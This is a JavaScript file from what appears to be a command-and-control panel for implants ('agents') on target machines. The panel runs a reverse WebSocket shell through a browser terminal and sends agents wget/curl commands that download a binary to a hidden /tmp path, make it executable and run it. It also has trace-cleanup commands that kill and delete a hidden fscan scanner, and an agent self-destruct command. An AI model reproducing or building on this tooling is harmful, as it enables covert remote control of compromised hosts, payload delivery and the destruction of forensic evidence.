        bar.style.display = "flex";
    } else {
        bar.style.display = "none";
    }
}

// ── WS Shell actions ─────────────────────────────────────────────────────────

async function wsshellStartBackend() {
    const ip   = (document.getElementById("wsshell-ip")?.value   || "").trim();
    const port = (document.getElementById("wsshell-port")?.value || "7337").trim();
    if (!ip) { toast("请填写控制端 IP", "error"); return; }

    try {
        await fetch("/api/settings", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ wspty_host: ip, wspty_port: port }),
        }).catch(() => {});

        const r = await fetch("/api/wsshell/start", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ controller_ip: ip, controller_port: port }),
        });
        const d = await r.json();
        if (d.error) { toast("启动失败: " + d.error, "error"); return; }

        toast(`cliws 已启动（端口 ${d.port}）`, "success");
        _wsshellSetStatus("● 运行中", "#2ecc71");
        _wsshellUpdateToolbar(true, false, false);
        _wsshellUpdateTmuxBar(d.tmux_session, d.attach_cmd);
    } catch (e) {
        toast("启动失败: " + (e.message || "网络错误"), "error");
    }
}

async function wsshellStopBackend() {
    const agentId = S.selectedAgent?.id || "";
    await fetch("/api/wsshell/stop", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: agentId }),
    }).catch(() => {});
    toast("cliws 已停止", "info");
    _wsshellOnStopped();
}

async function wsshellSaveConfig() {
    const ip   = (document.getElementById("wsshell-ip")?.value   || "").trim();
    const port = (document.getElementById("wsshell-port")?.value || "7337").trim();
    const payload = {};
    if (ip) payload.wspty_host = ip;
    if (port) payload.wspty_port = port;
    const r = await fetch("/api/settings", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });
    if (!r.ok) { toast("WS Shell 配置保存失败", "error"); return; }
    toast("WS Shell 配置已保存", "success");
    wsshellRefreshStatus();
}

function _wsshellBoundMatches(d) {
  if (!S.selectedAgent) return false;
  const bound = (d && d.bound_agent_id) || WSSHELL.boundAgent;
  if (!bound) return true; // 重启后 hydrate 的孤儿会话：允许接回
  if (S.selectedAgent.id === bound) return true;
  const sibs = new Set([
    ...(S.selectedAgent.sibling_ids || []),
    ...((d && d.bound_sibling_ids) || []),
  ]);
  return sibs.has(bound) || sibs.has(S.selectedAgent.id);
}

async function wsshellRefreshStatus() {
    try {
        const r = await fetch("/api/wsshell/status");
        const d = await r.json();
        if (d.bound_agent_id) WSSHELL.boundAgent = d.bound_agent_id;
        if (d.active) {
            const mine = !d.bound_agent_id || _wsshellBoundMatches(d);
            _wsshellSetStatus(
              WSSHELL.connected ? "● 已连接"
                : (mine ? "● 运行中" : "● 运行中（绑的是其他 agent）"),
              WSSHELL.connected ? "#2ecc71" : "#2ecc71");
            _wsshellUpdateToolbar(true, WSSHELL.connected, false);
            _wsshellUpdateTmuxBar(d.tmux_session, d.attach_cmd);
        } else {
            _wsshellSetStatus("● 已停止", "var(--text-2)");
            _wsshellUpdateToolbar(false, false, false);
            _wsshellUpdateTmuxBar(null, null);
        }
    } catch (_) {}
}

async function wsshellConnect() {
    if (!S.selectedAgent) { toast("先选择 Agent", "error"); return; }

    try {
        const r = await fetch("/api/wsshell/connect", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ agent_id: S.selectedAgent.id }),
        });
        const d = await r.json();
        if (d.error) { toast("连接失败: " + d.error, "error"); return; }

        WSSHELL.boundAgent = S.selectedAgent.id;
        const waitText = document.getElementById("wsshell-waiting-text");
        if (waitText) waitText.textContent = `等待 ${agentTag()} 反弹连接…`;
        toast(`wspty 命令已发送给 ${agentTag()}，等待反弹连接…`, "success");
        _wsshellSetStatus("● 等待连接", "#f39c12");
        _wsshellUpdateToolbar(true, false, true);
        document.getElementById("wsshell-waiting").style.display = "flex";
        document.getElementById("wsshell-term-wrap").style.display = "none";
        _wsshellStartPoll();
    } catch (e) {
        toast("连接失败: " + (e.message || "网络错误"), "error");
    }
}

function _wsshellStartPoll() {
    if (WSSHELL.pollTimer) clearInterval(WSSHELL.pollTimer);
    WSSHELL.pollTimer = setInterval(_wsshellPollStatus, 3000);
}

async function _wsshellPollStatus() {
    try {
        const r = await fetch("/api/wsshell/status");
        const d = await r.json();
        if (d.active) {
            WSSHELL._disconnectCount = 0;
            if (d.bound_agent_id) WSSHELL.boundAgent = d.bound_agent_id;
            if (!WSSHELL.connected && S.selectedAgent && _wsshellBoundMatches(d)) {
                _wsshellOpenTerminal();
            }
        } else if (WSSHELL.connected) {
            // Backend stopped while terminal was active — debounce 3 polls
            WSSHELL._disconnectCount = (WSSHELL._disconnectCount || 0) + 1;
            if (WSSHELL._disconnectCount >= 3) {
                _wsshellOnStopped();
            }
        } else {
            // Backend stopped while still waiting for agent to connect
            // (e.g. port conflict not caught by startup check, or cliws crash)
            _wsshellOnStopped();
        }
    } catch (_) {}
}

function _wsshellOpenTerminal() {
    if (!S.selectedAgent) return;
    // Guard: prevent double-call (poll fires every 3s; async xterm load can cause re-entry)
    if (WSSHELL.connected) return;

    // Ensure xterm.js is loaded before creating Terminal instance
    if (!_xtermReady) {
        _loadXterm().then(() => _wsshellOpenTerminal()).catch(e => {
            document.getElementById("wsshell-waiting").innerHTML =
                `<div style="color:#e74c3c;font-size:13px">❌ 终端库加载失败: ${e.message}</div>`;
        });
        return;
    }

    clearInterval(WSSHELL.pollTimer);
    WSSHELL.connected = true;
    _wsshellSetStatus("● 已连接", "#2ecc71");
    _wsshellUpdateToolbar(true, true, false);   // show ✖断开, hide ⚡触发连接

    document.getElementById("wsshell-waiting").style.display = "none";
    document.getElementById("wsshell-term-wrap").style.display = "flex";

    // Initialize xterm.js if not yet done
    const container = document.getElementById("wsshell-term");
    if (!WSSHELL.term) {
        const term = new Terminal({
            cursorBlink: true,
            convertEol:  true,
            fontFamily:  "JetBrains Mono, Fira Code, Cascadia Code, Consolas, monospace",
            fontSize: 14,
            scrollback: 5000,
            theme: {
                background: "#000000", foreground: "#e0e0e0", cursor: "#ffffff",
                black: "#1e1e1e",    brightBlack:   "#6b6b6b",
                red:   "#e06c75",    brightRed:     "#ff7f7f",
                green: "#98c379",    brightGreen:   "#b3e89b",
                yellow:"#e5c07b",    brightYellow:  "#ffd787",
                blue:  "#61afef",    brightBlue:    "#82cfff",
                magenta:"#c678dd",   brightMagenta: "#e5a0ff",
                cyan:  "#56b6c2",    brightCyan:    "#88d8e6",
                white: "#abb2bf",    brightWhite:   "#ffffff",
            },
        });
        WSSHELL.fitAddon = new FitAddon.FitAddon();
        term.loadAddon(WSSHELL.fitAddon);
        term.open(container);
        requestAnimationFrame(() => { try { WSSHELL.fitAddon.fit(); } catch {} });
        WSSHELL.term = term;
    } else {
        WSSHELL.term.clear();
    }

    const term = WSSHELL.term;

    // Connect browser WS to cliws proxy (Python relays to cliws)
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${proto}//${location.host}/wsshell/ws/${S.selectedAgent.id}`;
    const ws = new WebSocket(wsUrl);
    ws.binaryType = "arraybuffer";
    WSSHELL.ws = ws;

    ws.onopen = () => { _wsshellSendResize(); };

    ws.onmessage = (evt) => {
        if (evt.data instanceof ArrayBuffer) {
            term.write(new Uint8Array(evt.data));
        } else {
            term.write(evt.data);
        }
    };

    ws.onclose = () => { if (WSSHELL.connected) _wsshellOnAgentDisconnect(); };
    ws.onerror = () => { _wsshellSetStatus("● 连接错误", "#e74c3c"); };

    // Keyboard input → WS → agent PTY
    term.onData(data => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(new TextEncoder().encode(data));
        }
    });

    // Window resize → send TIOCSWINSZ magic packet
    term.onResize(({ cols, rows }) => { _wsshellSendResizeExact(rows, cols); });

    // ResizeObserver for container size changes
    if (!WSSHELL._resizeObs) {
        WSSHELL._resizeObs = new ResizeObserver(() => {
            if (WSSHELL.fitAddon && WSSHELL.connected) {
                try { WSSHELL.fitAddon.fit(); } catch {}
            }
        });
        WSSHELL._resizeObs.observe(container);
    }

    // ── Clipboard helpers (HTTP-safe, mirrors Shell tab) ────────────────────
    function _wsCopy(text) {
        if (!text) return;
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).catch(() => _wsCopyFallback(text));
        } else {
            _wsCopyFallback(text);
        }
    }
    function _wsCopyFallback(text) {
        const ta = document.createElement("textarea");
        ta.value = text;
        ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
        document.body.appendChild(ta);
        ta.focus(); ta.select();
        try { document.execCommand("copy"); } catch {}
        document.body.removeChild(ta);
        toast("已复制", "success");
    }

    // Floating paste box for HTTP context (no navigator.clipboard.readText)
    function _wsShowPasteBox() {
        let box = document.getElementById("wsshell-paste-box");
        if (box) { box.focus(); return; }
        box = document.createElement("textarea");
        box.id = "wsshell-paste-box";
        box.placeholder = "粘贴到此处 (Ctrl+V)，然后 Enter 发送 / Esc 取消";
        box.rows = 3;
        box.style.cssText = [
            "position:fixed","bottom:120px","right:24px",
            "width:340px","padding:8px 10px",
            "background:#1e1e1e","color:#e0e0e0",
            "border:1px solid #555","border-radius:6px",
            "font-size:13px","z-index:9999",
            "resize:none","outline:none",
            "box-shadow:0 4px 18px rgba(0,0,0,.5)",
        ].join(";");
        document.body.appendChild(box);
        box.focus();
        const _close = () => { try { document.body.removeChild(box); } catch {} term.focus(); };
        box.addEventListener("keydown", ev => {
            if (ev.key === "Enter" && !ev.shiftKey) {
                ev.preventDefault();
                const t = box.value;
                _close();
                if (t) term.paste(t);
            } else if (ev.key === "Escape") {
                _close();
            }
        });
        box.addEventListener("blur", () => setTimeout(() => {
            if (document.activeElement !== box) _close();
        }, 200));
    }
    function _wsDoPaste() {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.readText().then(t => { if (t) term.paste(t); }).catch(_wsShowPasteBox);
        } else {
            _wsShowPasteBox();
        }
    }

    // Intercept native paste on xterm's textarea (Ctrl+V in HTTP context)
    const _pasteTarget = term.textarea || term.element;
    _pasteTarget.addEventListener("paste", e => {
        e.preventDefault(); e.stopPropagation();
        const text = (e.clipboardData || window.clipboardData).getData("text/plain");
        if (text) term.paste(text);
    }, true);

    // Keyboard shortcuts: Ctrl+Shift+C copy, Ctrl+Shift+V paste
    term.attachCustomKeyEventHandler(e => {
        if (e.type !== "keydown") return true;
        if (e.ctrlKey && e.shiftKey && e.key === "C") {
            const sel = term.getSelection();
            if (sel) _wsCopy(sel);
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.key === "V") {
            _wsDoPaste();
            return false;
        }
        return true;
    });

    // Right-click: copy selection if any, else paste
    // Guard: only attach once per terminal instance
    if (!WSSHELL._listenersAttached) {
        WSSHELL._listenersAttached = true;
        container.addEventListener("contextmenu", e => {
            e.preventDefault();
            const sel = term.getSelection();
            if (sel) { _wsCopy(sel); } else { _wsDoPaste(); }
        });
    }

    // Keep polling status so we detect agent disconnect
    WSSHELL.statusTimer = setInterval(_wsshellPollStatus, 5000);
}

function _wsshellSendResize() {
    if (!WSSHELL.fitAddon || !WSSHELL.ws) return;
    WSSHELL.fitAddon.fit();
    const dims = WSSHELL.fitAddon.proposeDimensions();
    if (dims) _wsshellSendResizeExact(dims.rows, dims.cols);
}

function _wsshellSendResizeExact(rows, cols) {
    if (!WSSHELL.ws || WSSHELL.ws.readyState !== WebSocket.OPEN) return;
    const pkt = new Uint8Array(6);
    pkt[0] = 0x37; pkt[1] = 0x37;          // MAGIC_FLAG
    pkt[2] = (rows >> 8) & 0xFF; pkt[3] = rows & 0xFF;
    pkt[4] = (cols >> 8) & 0xFF; pkt[5] = cols & 0xFF;
    WSSHELL.ws.send(pkt);
}

function _wsshellOnAgentDisconnect() {
    // Agent WS closed but cliws backend may still be running
    WSSHELL.connected = false;
    WSSHELL._disconnectCount = 0;
    clearInterval(WSSHELL.statusTimer);
    WSSHELL.statusTimer = null;
    if (WSSHELL.ws) { WSSHELL.ws.close(); WSSHELL.ws = null; }
    document.getElementById("wsshell-term-wrap").style.display = "none";
    document.getElementById("wsshell-waiting").style.display   = "none";
    const viewer = document.getElementById("wsshell-session-viewer");
    if (viewer) viewer.style.display = "none";
    const backBtn = document.getElementById("wsshell-back-btn");
    if (backBtn) backBtn.style.display = "none";
    if (WSSHELL.term) {
        WSSHELL.term.writeln("\r\n\x1b[33m[WS Shell: 已断开]\x1b[0m");
    }
    wsshellLoadHistorySessions();
    // Refresh backend status — cliws may still be running, ready for next agent
    wsshellRefreshStatus();
    clearInterval(WSSHELL.pollTimer);
    WSSHELL.pollTimer = null;
}

function _wsshellOnStopped() {
    // cliws backend itself has stopped
    _wsshellOnAgentDisconnect();
    _wsshellSetStatus("● 已停止", "var(--text-2)");
    _wsshellUpdateToolbar(false, false, false);
    _wsshellUpdateTmuxBar(null, null);
}

async function wsshellClose() {
    if (!S.selectedAgent) return;
    await fetch("/api/wsshell/disconnect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: S.selectedAgent.id }),
    }).catch(() => {});
    _wsshellOnAgentDisconnect();
    toast("已断开 Agent 连接，cliws 仍在运行", "success");
}

async function wsshellForceClose() {
    const agentId = S.selectedAgent?.id || "";
    await fetch("/api/wsshell/disconnect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: agentId }),
    }).catch(() => {});
    _wsshellOnAgentDisconnect();
}

async function wsshellLoadHistorySessions() {
    if (!S.selectedAgent) return;
    try {
        const r = await fetch(`/api/wspty/sessions/${S.selectedAgent.id}`);
        const rows = await r.json();
        const sel = document.getElementById("wsshell-sessions");
        if (!sel) return;
        sel.innerHTML = '<option value="">-- 选择会话查看记录 --</option>';
        for (const s of rows) {
            const opt = document.createElement("option");
            opt.value = s.session_id;
            const dt = s.started_at?.substring(0, 16).replace("T", " ") || "?";
            const end = s.ended_at?.substring(11, 16) || "进行中";
            opt.textContent = `${dt} → ${end} (${Math.round((s.bytes||0)/1024)}KB)`;
            sel.appendChild(opt);
        }
        document.getElementById("wsshell-history-bar").style.display =
            rows.length ? "flex" : "none";
    } catch (_) {}
}

async function wsshellLoadSession(sessionId) {
    const viewer = document.getElementById("wsshell-session-viewer");
    const backBtn = document.getElementById("wsshell-back-btn");
    if (!viewer) return;
    if (!sessionId) {
        viewer.style.display = "none";
        if (backBtn) backBtn.style.display = "none";
        return;
    }
    try {
        const r = await fetch(`/api/wspty/session/${sessionId}?agent_id=${encodeURIComponent(S.selectedAgent?.id || "")}`);
        const d = await r.json();
        // PTY 原始流含转义序列（如 bracketed-paste 的 ESC[?2004h/l）——
        // 纯文本查看器里显示为乱码，也污染 AI agent 读取，统一剥离。
        const ESC = String.fromCharCode(27);
        const clean = (d.content || "(empty)")
            .split(ESC + "[?2004h").join("")          // bracketed paste on
            .split(ESC + "[?2004l").join("")          // bracketed paste off
            .replace(new RegExp(ESC + "\\[[0-9;?]*[a-zA-Z]", "g"), "")  // CSI
            .replace(new RegExp(ESC + "\\][^\\x07]*\\x07", "g"), "")    // OSC title
            .replace(new RegExp(ESC + "[=>NOR]", "g"), "")              // key modes
            .replace(/\r(?!\n)/g, "");                                  // bare CR
        viewer.textContent = clean;
        // Show viewer BELOW the live terminal — never hide the terminal
        viewer.style.display = "block";
        if (backBtn) backBtn.style.display = "inline-flex";
        // Scroll to bottom of history
        viewer.scrollTop = viewer.scrollHeight;
    } catch (_) {}
}

// Close the history viewer and return focus to live terminal
function wsshellBackToLive() {
    const viewer = document.getElementById("wsshell-session-viewer");
    const backBtn = document.getElementById("wsshell-back-btn");
    const sel = document.getElementById("wsshell-sessions");
    if (viewer) viewer.style.display = "none";
    if (backBtn) backBtn.style.display = "none";
    if (sel) sel.value = "";
    // Re-focus xterm if connected
    if (WSSHELL.term && WSSHELL.connected) WSSHELL.term.focus();
}

// Called when WS Shell tab becomes active
function _wsshellOnTabActive() {
    _wsshellUpdateAgentIndicator();
    wsshellLoadHistorySessions();
    _loadXterm().catch(e => console.warn("xterm preload failed:", e));
    wsshellRefreshStatus();
    // F5 后不要重发 wspty；cliws 还在就恢复 poll，接回已有 PTY
    fetch("/api/wsshell/status").then(r => r.json()).then(d => {
      if (d.active && _wsshellBoundMatches(d) && !WSSHELL.connected) {
        _wsshellStartPoll();
      }
    }).catch(() => {});
}

// ── 目标机痕迹清理（走加密命令通道，无需活跃 WS Shell）────────────────────
// 经 Agent 轮询执行，通常 15–30 秒内生效；结果回显在终端。

const SWEEP_CMDS = {
    // fscan 是额外下载的二进制（/tmp/.san）——杀进程+删文件
    scan:   "pkill -f '/tmp/.san' 2>/dev/null; sleep 1; rm -f /tmp/.san; echo '[scan] cleaned'",
    // 隧道目标端是 Agent 内置节点（纯内存，无文件）——优雅停止命令；
    // 旧版 pkill /tmp/.netd 是 Go stowaway 时代死命令，已废弃
    tunnel: "tunnel:close",
};

function agentSweep(type) {
    if (!S.selectedAgent) { toast("请先在左侧选择 agent", "error"); return; }
    const cmd = SWEEP_CMDS[type];
    if (!cmd) return;
    const labels = { scan: "扫描器 fscan (/tmp/.san，杀进程+删文件)", tunnel: "内置隧道节点（优雅停止，无文件可清）" };
    if (!confirm(`确认清理 ${agentTag()} 上的 ${labels[type]}？\n\n通过加密命令通道下发，约 15–30 秒生效，结果回显在终端。`)) return;
    sendRaw(cmd).then(() => toast(`已发送清理命令 ${agentTag()} · ${labels[type]}`, "success"));
}

function _upgStatus(msg, color) {
  const el = document.getElementById("upg-status");
  if (el) { el.textContent = msg; el.style.color = color || "var(--text-2)"; }
}

async function upgDownloadAndUpgrade() {
  if (!S.selectedAgent) { toast("先选择 agent", "error"); return; }
  const url      = (document.getElementById("upg-url")?.value || "").trim();
  const savePath = (document.getElementById("upg-dest-path")?.value || "/tmp/.agent_upg").trim();
  if (!url) { toast("请输入新二进制的 URL", "error"); return; }
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    toast("URL 必须以 http:// 或 https:// 开头", "error"); return;
  }

  // Persist values silently
  fetch("/api/settings", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ upgrade_url: url, upgrade_dest: savePath })
  }).catch(() => {});

  const agentId = S.selectedAgent.id;

  // Step 1: Download the binary on the agent using wget/curl fallback
  // Using -f (fail on HTTP error), -s (silent), -S (show errors), -o (output path)
  // Single-quoted URL and path to handle special characters
  const dlCmd = `wget -qO '${savePath}' '${url}' 2>/dev/null || curl -fsSo '${savePath}' '${url}' 2>/dev/null; [ -s '${savePath}' ] && echo __DL_OK__ || echo __DL_FAIL__`;

  _upgStatus("⏳ 步骤 1/3：发送下载命令…", "var(--text-2)");
  const r1 = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: agentId, command: dlCmd })
  });
  const d1 = await r1.json();
  if (!r1.ok || d1.error) { _upgStatus("命令发送失败: " + (d1.error || r1.status), "#e74c3c"); return; }

  const cmdId = d1.command_id;
  _upgStatus("⏳ 步骤 1/3：等待 agent 下载文件（最多 120s）…", "var(--text-2)");

  // Poll for download result
  const dlResult = await _upgPollResponse(agentId, cmdId, 120);
  if (!dlResult) { _upgStatus("❌ 等待超时，agent 未响应（网络问题？）", "#e74c3c"); return; }
  if (dlResult.includes("__DL_FAIL__") || !dlResult.includes("__DL_OK__")) {
    _upgStatus("❌ 下载失败：" + dlResult.replace(/__DL_(OK|FAIL)__/g,"").trim().substring(0, 100), "#e74c3c"); return;
  }

  // Step 2: chmod +x
  _upgStatus("⏳ 步骤 2/3：设置可执行权限…", "var(--text-2)");
  const r2 = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: agentId, command: `chmod +x '${savePath}'` })
  });
  const d2 = await r2.json().catch(() => ({}));
  if (!r2.ok || d2.error) { _upgStatus("chmod 发送失败: " + (d2.error || r2.status), "#e74c3c"); return; }
  if (d2.command_id) {
    const chmodOut = await _upgPollResponse(agentId, d2.command_id, 60, "步骤 2/3：等待 chmod");
    if (chmodOut && /error|fail|permission denied/i.test(chmodOut)) {
      _upgStatus("❌ chmod 失败：" + chmodOut.substring(0, 160), "#e74c3c"); return;
    }
  }

  // Step 3: upgrade — wait for agent 回显，不要先报成功
  _upgStatus("⏳ 步骤 3/3：发送 upgrade 命令…", "var(--text-2)");
  const r3 = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: agentId, command: `upgrade ${savePath}` })
  });
  const d3 = await r3.json();
  if (!r3.ok || d3.error) { _upgStatus("upgrade 命令失败: " + (d3.error || r3.status), "#e74c3c"); return; }
  const upgOut = await _upgPollResponse(agentId, d3.command_id, 90, "步骤 3/3：等待 agent 确认升级");
  if (!upgOut) {
    _upgStatus("❌ 升级无回显（超时）。不要假定已成功，请看终端。", "#e74c3c"); return;
  }
  if (/error|fail|invalid|not found/i.test(upgOut)) {
    _upgStatus("❌ 升级失败：" + upgOut.substring(0, 200), "#e74c3c"); return;
  }
  _upgStatus("✅ Agent 已确认升级：" + upgOut.substring(0, 120), "#2ecc71");
  toast("Upgrade 已得到 agent 确认", "success");
}

// Poll messages for a specific command_id response, timeout in seconds
async function _upgPollResponse(agentId, cmdId, timeoutSecs, label) {
  const deadline = Date.now() + timeoutSecs * 1000;
  const title = label || "步骤 1/3：等待 agent 下载文件";
  while (Date.now() < deadline) {
    await new Promise(res => setTimeout(res, 3000));
    try {
      const r = await fetch(`/api/messages/${agentId}`);
      if (!r.ok) continue;
      const d = await r.json();
      const msgs = d.messages || [];
      for (const m of msgs) {
        if (!m.is_command && m.response_to === cmdId) {
          return m.content || "";
        }
      }
    } catch(_) {}
    const elapsed = Math.round((Date.now() - (deadline - timeoutSecs * 1000)) / 1000);
    _upgStatus(`⏳ ${title}… (${elapsed}s)`, "var(--text-2)");
  }
  return null; // timeout
}

async function upgSendManual() {
  if (!S.selectedAgent) { toast("先选择 agent", "error"); return; }
  const path = (document.getElementById("upg-manual-path")?.value || "").trim();
  if (!path) { toast("请输入远程文件路径", "error"); return; }

  // Persist silently
  fetch("/api/settings", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ upgrade_manual_path: path })
  }).catch(() => {});

  const r = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: S.selectedAgent.id, command: `upgrade ${path}` })
  });
  const d = await r.json();
  if (!r.ok || d.error) { toast("发送失败: " + (d.error || r.status), "error"); return; }
  _upgStatus("⏳ 等待 agent 确认手动升级…", "var(--text-2)");
  const out = await _upgPollResponse(S.selectedAgent.id, d.command_id, 90, "手动升级：等待确认");
  if (!out) {
    toast("升级无回显（超时），不要假定已成功", "error");
    _upgStatus("❌ 手动升级无回显", "#e74c3c");
    return;
  }
  if (/error|fail|invalid|not found/i.test(out)) {
    toast("升级失败: " + out.substring(0, 160), "error");
    _upgStatus("❌ " + out.substring(0, 160), "#e74c3c");
    return;
  }
  toast("Agent 已确认升级", "success");
  _upgStatus("✅ " + out.substring(0, 120), "#2ecc71");
}

async function upgUninstall() {
  if (!S.selectedAgent) { toast("先选择 agent", "error"); return; }
  if (!confirm(`确认卸载 agent ${S.selectedAgent.hostname}（${S.selectedAgent.id}）？\n\n此操作不可逆，agent 将自毁并从目标机器彻底删除。`)) return;

  const r = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: S.selectedAgent.id, command: "uninstall" })
  });
  const d = await r.json();
  if (!r.ok || d.error) { toast("发送失败: " + (d.error || r.status), "error"); return; }
  toast("Uninstall 命令已发送，agent 将自毁", "success");
}
